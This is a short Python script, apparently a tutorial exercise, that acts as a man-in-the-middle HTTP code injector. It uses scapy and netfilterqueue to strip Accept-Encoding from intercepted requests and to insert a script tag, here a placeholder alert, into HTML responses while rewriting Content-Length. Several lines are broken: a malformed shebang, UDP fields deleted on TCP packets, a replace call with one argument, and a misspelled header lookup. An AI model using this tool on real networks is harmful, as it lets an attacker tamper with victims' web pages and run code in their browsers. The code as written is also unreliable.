#!usr/bin/env python
import scapy.all as scapy
import netfilterqueue
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.UDP].len
    del packet[scapy.UDP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            # print("[+] Request")
            # print(scapy_packet.show())
            # modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            # new_packet = set_load(scapy_packet, modified_load)
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            injection_code = "<script>alert('test');</script>"
            # print(scapy_packet.show())
            # modified_load = scapy_packet[scapy.Raw].load.replace("</body>", "<script>alert('test');</script></")
            # load = load.replace("</body>", "<script>alert('test');</script></body>")
            load = load.replace("</body>"+ injection_code + "</body>")
            # new_packet = set_load(scapy_packet, load)
            # packet.set_payload(str(new_packet))
            # content_length_search = re.search("Content_length:\s\d*", load)
            content_length_search = re.search("(?:Content_length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(0)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))


        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

